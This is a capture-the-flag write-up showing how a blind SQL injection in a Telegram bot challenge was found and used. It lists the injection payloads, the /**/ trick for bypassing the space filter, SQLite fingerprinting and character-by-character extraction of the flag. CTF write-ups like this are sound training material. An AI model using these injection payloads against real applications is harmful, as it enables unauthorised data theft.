## Robabikia (906 points)

### Description
In 70's my grandfather sold a flag but I think we lost the value of it, can you help us find it? Contact the seller: https://t.me/crewctf_Robabikia_bot

Author: omakmoh#1070

https://t.me/crewctf_Robabikia_bot

### Telegram bot
This challenge starts with messaging the telegram bot:
```
/start
----------------------------------------------------
/items - Return the item list.
/price - Return the price of item.
/desc - Return the description of item.
/value - Return the value of item.
/help or /start - list available commands to use.
Use the command and specifiy the item ID
```
Listing the items:
```
/items 
----------------------------------------------------
1 - Broken Radio
2 - Fridge
3 - Goldstar TV
4 - Plastic Table
5 - Old Ancient FLAG
```
Price:
```
/price 5
----------------------------------------------------
31337$
```
Description:
```
/desc 5
----------------------------------------------------
The old ancient flag your Grandfather want.
```
Value (should be the flag):
```
/value 5
----------------------------------------------------
This feature currently Temporary Disabled
```

### SQL Injection confirmation
Probable SQL Injection:
```
/desc 1'
----------------------------------------------------
Error has been occured
```
Confirmed SQL Injection:
```
/desc 1' OR '
----------------------------------------------------
Radio to listen uninterrupted music, but need to fix
```
More complex queries like this didn't work:
```
/desc 1' OR (SELECT 1) OR '1
----------------------------------------------------
Error has been occured
```

### SQL Injection method discovery
In order to be able to run more complex queries that need SPACES, you can replace them with inline comments `/**/`, so this queries now let us determine DBMS:
```
/desc '/**/OR/**/@@version/**/--
----------------------------------------------------
Error has been occured


/desc '/**/OR/**/sqlite_version()/**/--
----------------------------------------------------
Radio to listen uninterrupted music, but need to fix
```
So, looks like a Blind SQL Injection on `desc` parameter, SQLite back-end.

As the challenge description states - we need to find the value of the flag (item 5). This query confirms we have `value` column in this table
```
/desc '/**/GROUP/**/BY/**/value--
----------------------------------------------------
Item not found
```

Let's find the length of the flag (hopefully):
```
/desc 5'/**/AND/**/LENGTH(value)>35
----------------------------------------------------
The old ancient flag your Grandfather want.

/desc 5'/**/AND/**/LENGTH(value)>50 --
----------------------------------------------------
Item not found


[after few queries...]


/desc 5'/**/AND/**/LENGTH(value)=47 --
----------------------------------------------------
The old ancient flag your Grandfather want.
```

Length of the flag is 47. We can pretty easily confirm, that this indeed is the flag by checking the first characters for the flag format:
```
/desc 5'/**/AND/**/value/**/LIKE/**/'crew%{%}' --
----------------------------------------------------
The old ancient flag your Grandfather want.
```

### Getting the flag
I have tried UNION Selects and spend few hours on trying to find quicker way, but I ended up in just using Blind SQL Injection to dump the flag
```
/desc 5'/**/AND/**/SUBSTR(value,1,1)/**/>/**/'a' --
----------------------------------------------------
The old ancient flag your Grandfather want.

...
...
...
```
It took me approx. 1 hour to dump the 47 (- 6 because of known format) characters long flag using Blind SQL Injection on the Telegram Bot. 

For some reason, I feel satisfied. :D
```
/desc 5'/**/AND/**/value/**/LIKE/**/'crew{U53_fa57_WAY_1n_5QL_1nj3C710N_1N_t3l3_B0t}' --
----------------------------------------------------
The old ancient flag your Grandfather want.
```
